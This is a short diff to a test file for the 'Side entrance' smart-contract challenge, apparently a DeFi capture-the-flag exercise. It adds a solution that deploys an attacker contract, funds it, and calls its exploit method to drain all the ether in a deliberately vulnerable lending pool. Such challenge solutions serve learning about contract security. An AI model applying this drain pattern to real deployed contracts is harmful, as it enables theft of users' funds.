@@ -25,7 +25,17 @@ describe('[Challenge] Side entrance', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        /**Deploy the attacker SC from player */
+        let auxSC = await (await ethers.getContractFactory('auxSideEntrance', player)).deploy(pool.address);
+
+        /**Send ether to make txs from the attacker SC */
+        await player.sendTransaction({
+            to: auxSC.address,
+            value : ethers.utils.parseEther("0.5")
+        })
+
+        /**Execute the exploy method coded in the atacker SC sending all the ether in the pool as value */
+        await auxSC.connect(player).exploit(ETHER_IN_POOL);
     });
 
     after(async function () {
